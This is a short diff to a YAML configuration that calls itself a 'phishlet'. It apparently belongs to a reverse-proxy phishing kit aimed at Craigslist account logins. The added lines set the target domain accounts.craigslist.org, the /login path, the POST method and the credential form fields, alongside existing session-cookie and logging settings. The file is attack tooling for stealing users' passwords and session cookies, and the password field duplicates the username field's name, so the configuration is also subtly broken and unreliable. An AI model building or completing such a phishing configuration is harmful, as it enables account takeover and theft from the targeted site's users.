@@ -82,6 +82,15 @@ session_handling:
   session_lifetime: 3600              # Time in seconds for session expiry
   session_cookie: 'cl_session'        # Session tracking cookie
 
+login:
+  domain: 'accounts.craigslist.org'  # The target domain for the login form
+  path: '/login'  # Path for login form submission
+  method: 'POST'  # HTTP method for form submission
+  form:
+    fields:
+      - { name: 'inputEmailHandle', required: true }    # Username field
+      - { name: 'inputEmailHandle', required: true }      # Password field
+
 logging:
   enabled: true                       # Enable logging for phishlet
   level: 'info'                      # Log level (info, debug, warn, error)
